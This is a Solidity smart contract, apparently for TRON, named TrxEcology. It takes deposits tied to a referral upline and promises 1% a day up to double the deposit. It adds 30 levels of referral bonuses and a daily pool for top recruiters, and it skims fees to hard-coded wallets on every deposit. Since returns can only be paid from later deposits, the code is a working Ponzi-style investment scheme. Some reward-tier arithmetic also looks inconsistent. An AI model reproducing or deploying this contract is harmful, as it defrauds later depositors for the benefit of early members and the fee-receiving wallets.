//SourceUnit: TrxEcology.sol

pragma solidity >=0.4.22 <0.6.0;


interface TokenTrb { 
    
    function transfer(address to, uint256 value) external 
    
        returns (bool success); 
    
}

contract TrxEcology {
    
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
        
        uint256 srewards;
    }

    address payable public          owner;
    address payable[] public        market_fee;
    address payable public          foundation_fee;
    address payable public          trbchain_fund;

    mapping(address => User) public users;

    uint256[] public cycles;
    uint8[] public ref_bonuses;                     // 1 => 1%

    uint8[] public pool_bonuses;                    // 1 => 1%
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;                    // 3 => 3%
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    uint256 public total_rewards;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
    event NewRewards(address indexed addr, uint256 amount);

    constructor(address payable _owner) public {
        owner = _owner;
        
        foundation_fee = address(0x417E77FA07A1E5759BB94A5BDAD2FCF39D113DC24B);
        
        trbchain_fund = address(0x413AA882F8B8AD41AF259153E5C02DE5B549760077);
        
        market_fee.push(address(0x413CE4A31133E3E099AF064DDDE1E69C6B564B32BB));
        market_fee.push(address(0x41F113905364DD8B7DCE7B51F723A4AB308186434C));
        market_fee.push(address(0x4175F804463FEC53C3C3C10533ABFBD418F52ECA24));
        market_fee.push(address(0x41B7CFFA10E1540E6E16AD641EE8FB59463D69BABC));
        market_fee.push(address(0x41CDC73006A74024D286517E88DE1BE8C18158C5C6));
        market_fee.push(address(0x41470D17984A20389151EE7D0290828E7633EF53C5));
        market_fee.push(address(0x41794CBB731426F5CE268162D1215D0960E7D65E54));
        market_fee.push(address(0x414C11FFE1B780B2B48B5D5CE2D06C77176C368FAB));
        market_fee.push(address(0x417B0F8FCC2A9FE78F89C55E2D7FD457CAB666138E));
        market_fee.push(address(0x41869DA5716B36694DF1953918C9EBF1B67AB9EF3C));
        
        ref_bonuses.push(30);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(2);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);

        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(10);
        pool_bonuses.push(10);
        pool_bonuses.push(5);
        pool_bonuses.push(5);
        pool_bonuses.push(5);
        pool_bonuses.push(5);
        pool_bonuses.push(5);
        pool_bonuses.push(5);

        cycles.push(1e11);
        cycles.push(3e11);
        cycles.push(9e11);
        cycles.push(2e12);
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= 3e8 && _amount <= cycles[0], "Bad amount");
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;
        
        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 10;

            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }

        _pollDeposits(_addr, _amount);

        if(pool_last_draw + 1 days < block.timestamp) {
            _drawPool();
        }

        trbchain_fund.transfer(_amount * 1 / 100);  // 1%
        foundation_fee.transfer(_amount * 3 / 100);
        for(uint8 i = 0; i < market_fee.length; i++) {
            address payable up = market_fee[i];
            if(up == address(0)) break;
            up.transfer(_amount * 5 / 1000);
        }
        
        _tokenRewards(_addr, _amount, total_deposited);
        
    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                
                users[up].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;
            
            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
            
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }
    
    function _tokenRewards(address _addr, uint256 _amount, uint256 _total_deposited) private {
        
        // trb 
        if(_total_deposited > 0 && _total_deposited <= 1e15) {//10 y
            
            _transferTokenTrb(_addr, _amount/10 * 1);// * 1e6
            
        } else if(_total_deposited > 1e15 && _total_deposited <= 2e15) {
            
            _transferTokenTrb(_addr, _amount/20 * 2);
            
        } else if(_total_deposited > 2e15 && _total_deposited <= 3e15) {
            
            _transferTokenTrb(_addr, _amount/40 * 3);
            
        } else if(_total_deposited > 3e15 && _total_deposited <= 4e15) {
            
            _transferTokenTrb(_addr, _amount/80 * 4);
            
        } else if(_total_deposited > 4e15 && _total_deposited <= 5e15) {
            
            _transferTokenTrb(_addr, _amount/160 * 5);
            
        } else if(_total_deposited > 5e15 && _total_deposited <= 6e15) {
            
            _transferTokenTrb(_addr, _amount/320 * 6);
            
        } else if(_total_deposited > 6e15 && _total_deposited <= 7e15) {
            
             _transferTokenTrb(_addr, _amount/640 * 7);
            
        } else if(_total_deposited > 7e15 && _total_deposited <= 8e15) {
            
            _transferTokenTrb(_addr, _amount/128 * 8);
            
        } else if(_total_deposited > 8e15 && _total_deposited <= 9e15) {
            
            _transferTokenTrb(_addr, _amount/256 * 9);
            
        } else if(_total_deposited > 9e15 && _total_deposited <= 1e16) {
            
            _transferTokenTrb(_addr, _amount/512 * 10);
            
        }
        
    }
    
    function _transferTokenTrb(address _addr,uint256 _amount)  private{
        
        require(_amount > 0, "TRB Less Zero");
        
        address trbAddress = address(0x41E58543B27D5C0F31AC41498C023F1B77758C385D);
        TokenTrb token = TokenTrb(trbAddress); //trb
        token.transfer(_addr, _amount);
        
        users[_addr].srewards += _amount;
        total_rewards += _amount;
        
        emit NewRewards(_addr, _amount);
    }

    function deposit(address _upline) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }
    
    

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }
        
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        
        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        msg.sender.transfer(to_payout);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 20 / 10;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].deposit_payouts;
            
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 srewards) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].srewards);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_rewards, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_rewards, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    function poolTopInfo() view external returns(address[10] memory addrs, uint256[10] memory deps) {
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
        
    }
    
}